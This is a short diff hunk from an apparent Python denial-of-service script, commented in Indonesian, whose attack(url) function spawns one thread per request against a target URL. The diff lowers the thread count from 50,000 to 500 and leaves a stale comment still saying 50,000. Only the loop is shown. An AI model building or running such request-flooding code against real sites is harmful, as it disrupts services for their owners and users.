@@ -18,7 +18,7 @@ def attack(url):
     start_time = time.time()
 
     # Menjalankan thread untuk mengirim request
-    for _ in range(50000):  # 50.000 request secara otomatis
+    for _ in range(500):  # 50.000 request secara otomatis
         thread = threading.Thread(target=send, args=(url,))
         thread.start()
         threads.append(thread)
